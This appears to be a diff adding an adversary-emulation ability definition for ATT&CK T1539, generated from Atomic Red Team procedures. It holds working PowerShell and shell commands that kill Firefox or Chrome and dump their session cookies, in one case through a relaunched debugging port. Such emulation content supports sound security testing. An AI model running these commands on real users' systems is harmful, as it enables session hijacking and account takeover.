@@ -1,0 +1,21 @@
+- id: 27d14d06-03c2-4a0f-9791-3d1c6ac1d552
+  name: Steal Web Session Cookie
+  description: Ability for Steal Web Session Cookie (ATT&CK T1539). Generated from
+    Atomic Red Team procedures; review and test safely before use.
+  tactic: credential-access
+  technique:
+    attack_id: T1539
+    name: Steal Web Session Cookie
+  platforms:
+    windows:
+      psh:
+        command: 'stop-process -name "firefox" -force -erroraction silentlycontinue
+          $CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"
+          "select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite
+          from [moz_cookies];" | cmd /c #{sqlite3_path} "$CookieDBLocation" | out-file
+          -filepath "#{output_file}"'
+    darwin:
+      sh:
+        command: killall 'Google Chrome' sleep 1 open -a "/Applications/Google Chrome.app/Contents/MacOS/Google
+          Chrome" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/
+          sleep 1 /tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337
